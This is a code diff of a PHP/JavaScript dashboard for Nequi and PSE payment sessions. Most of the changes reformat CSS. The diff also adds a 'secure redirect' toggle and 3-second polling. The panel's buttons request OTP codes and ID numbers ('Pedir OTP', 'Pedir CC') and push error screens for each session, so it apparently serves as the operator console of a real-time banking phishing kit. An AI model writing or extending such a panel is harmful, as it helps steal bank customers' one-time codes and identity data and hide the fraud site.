@@ -391,19 +391,40 @@ require_once __DIR__ . '/auth.php';
         }
 
         /* Specific mini colors */
-        .act-whats { background: #16a34a; color: #fff; border: 1px solid #14532d; }
-        .act-sel { background: #7c3aed; border: 1px solid #5b21b6; }
-        .act-doc { background: #9333ea; border: 1px solid #6b21a8; }
-        .act-dyn { background: #d97706; color: #fff; border: 1px solid #92400e; }
-        
+        .act-whats {
+            background: #16a34a;
+            color: #fff;
+            border: 1px solid #14532d;
+        }
+
+        .act-sel {
+            background: #7c3aed;
+            border: 1px solid #5b21b6;
+        }
+
+        .act-doc {
+            background: #9333ea;
+            border: 1px solid #6b21a8;
+        }
+
+        .act-dyn {
+            background: #d97706;
+            color: #fff;
+            border: 1px solid #92400e;
+        }
+
         /* ERROR RED BUTTONS */
         .btn-err {
-            background: #dc2626; /* Darker red */
+            background: #dc2626;
+            /* Darker red */
             color: white;
             border: 1px solid #991b1b;
             font-weight: 700;
         }
-        .btn-err:hover { background: #b91c1c; }
+
+        .btn-err:hover {
+            background: #b91c1c;
+        }
 
         .act-otp {
             background: #0ea5e9;
@@ -539,6 +560,44 @@ require_once __DIR__ . '/auth.php';
                 <i class="fas fa-radiation"></i> DELETE ALL
             </button>
         </div>
+
+        <!-- Redirect Toggle -->
+        <div
+            style="display:flex; align-items:center; background:#252525; padding:5px 10px; border-radius:6px; border:1px solid #444;">
+            <span style="font-size:0.8rem; color:#aaa; margin-right:10px;">Redirect Seguro:</span>
+            <label class="switch" style="position:relative; display:inline-block; width:40px; height:20px;">
+                <input type="checkbox" id="redirectToggle" onchange="toggleRedirect(this)">
+                <span class="slider"
+                    style="position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background-color:#ccc; transition:.4s; border-radius:20px;"></span>
+            </label>
+            <style>
+                .switch input {
+                    opacity: 0;
+                    width: 0;
+                    height: 0;
+                }
+
+                .slider:before {
+                    position: absolute;
+                    content: "";
+                    height: 16px;
+                    width: 16px;
+                    left: 2px;
+                    bottom: 2px;
+                    background-color: white;
+                    transition: .4s;
+                    border-radius: 50%;
+                }
+
+                input:checked+.slider {
+                    background-color: #00ff88;
+                }
+
+                input:checked+.slider:before {
+                    transform: translateX(20px);
+                }
+            </style>
+        </div>
     </div>
 
     <!-- MAIN GRID -->
@@ -571,6 +630,45 @@ require_once __DIR__ . '/auth.php';
         let currentFilter = 'all';
         let isUpdating = false;
         let expandedCards = new Set(); // Track open dropdowns
+
+        // --- INIT ---
+        document.addEventListener('DOMContentLoaded', () => {
+            checkRedirectStatus();
+            updateData(); // Initial load
+            setInterval(updateData, 3000); // Polling every 3s
+        });
+
+        // --- REDIRECT SETTINGS ---
+        async function checkRedirectStatus() {
+            try {
+                const res = await fetch('settings.php?action=get_redirect');
+                const json = await res.json();
+                if (json.status === 'success') {
+                    document.getElementById('redirectToggle').checked = json.enabled;
+                }
+            } catch (e) {
+                console.error("Error fetching redirect status", e);
+            }
+        }
+
+        async function toggleRedirect(checkbox) {
+            const enabled = checkbox.checked;
+            try {
+                const res = await fetch('settings.php?action=set_redirect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ enabled: enabled })
+                });
+                const json = await res.json();
+                if (json.status !== 'success') {
+                    alert("Error updating setting");
+                    checkbox.checked = !enabled; // Revert
+                }
+            } catch (e) {
+                alert("Network error");
+                checkbox.checked = !enabled; // Revert
+            }
+        }
 
         // --- UPDATE CLOCK ---
         setInterval(() => {
@@ -712,16 +810,16 @@ require_once __DIR__ . '/auth.php';
         // --- BUTTONS BUILDER NEW DESIGN ---
         function getButtons(id, type, isOpen) {
             let b = '';
-            
+
             // Primary Actions (Always Visible)
             b += `<div class="btn-group-primary">`;
             if (type === 'nequi') {
-                 b += `<button class="btn-act act-otp" onclick="act(${id},'nequi',3)">Pedir OTP</button>`;
-                 b += `<button class="btn-act act-fin" onclick="act(${id},'nequi',0)">Finalizar</button>`;
+                b += `<button class="btn-act act-otp" onclick="act(${id},'nequi',3)">Pedir OTP</button>`;
+                b += `<button class="btn-act act-fin" onclick="act(${id},'nequi',0)">Finalizar</button>`;
             } else {
-                 b += `<button class="btn-act act-otp" onclick="act(${id},'pse',3)">Pedir OTP</button>`;
-                 b += `<button class="btn-act act-cc" onclick="act(${id},'pse',5)">Pedir CC</button>`;
-                 b += `<button class="btn-act act-fin" onclick="act(${id},'pse',7)">Finalizar</button>`;
+                b += `<button class="btn-act act-otp" onclick="act(${id},'pse',3)">Pedir OTP</button>`;
+                b += `<button class="btn-act act-cc" onclick="act(${id},'pse',5)">Pedir CC</button>`;
+                b += `<button class="btn-act act-fin" onclick="act(${id},'pse',7)">Finalizar</button>`;
             }
             b += `</div>`;
 
@@ -729,7 +827,7 @@ require_once __DIR__ . '/auth.php';
             const icon = isOpen ? 'fa-chevron-up' : 'fa-chevron-down';
             const text = isOpen ? 'Menos Opciones' : 'Más Opciones / Errores';
             const style = isOpen ? 'background:#333; color:#efefef;' : '';
-            
+
             b += `<button class="btn-expand" onclick="toggleActions(this, ${id})" style="${style}">
                     <i class="fas ${icon}"></i> ${text}
                   </button>`;
@@ -737,7 +835,7 @@ require_once __DIR__ . '/auth.php';
             // Hidden Secondary Actions
             const display = isOpen ? 'block' : 'none';
             b += `<div class="actions-hidden" style="display:${display}; margin-top:10px;">`;
-            
+
             // 1. Errors Section
             b += `<div class="action-category"><span class="cat-title">⚠️ Reportar Errores (Rojo)</span><div class="btn-grid-mini">`;
             if (type === 'nequi') { // Nequi Errors
